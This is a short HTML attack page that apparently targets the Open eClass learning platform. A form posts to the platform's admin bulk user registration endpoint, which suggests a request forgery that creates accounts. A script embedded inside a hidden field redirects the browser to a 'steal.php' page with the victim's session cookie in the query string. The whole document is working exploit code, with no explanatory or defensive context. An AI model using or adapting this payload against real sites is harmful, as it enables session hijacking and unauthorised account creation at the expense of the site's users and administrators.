<form method='post' action='http://localhost/openeclass/modules/admin/multireguser.php'>
<table class='FormData'>
<tr>
    <td><input type='hidden' name='fields' size='50' value='first last id email phone' /></td>
<tr>
    <td><input type='hidden' class='auth_input' name='user_info' rows='10' cols='60' />
	<script>
	window.location ='http://localhost/openeclass/steal.php?cookie='+encodeURI(document.cookie);
	</script>
	</td>
</tr>
<tr>
    <td><select name='type'>
        <option value='stud'></option>
        <option value='prof'></option></select></td>
</tr>
<tr>
    <td><input type='text' name='prefix' size='10' value='user' /></td>
</tr>

<tr>
    <td><input type='text' name='am' size='10' /></td>
</tr>

<tr>
    <td><input type='submit' name='submit' value='Submit' /></td>
</tr>
</table>
</form>
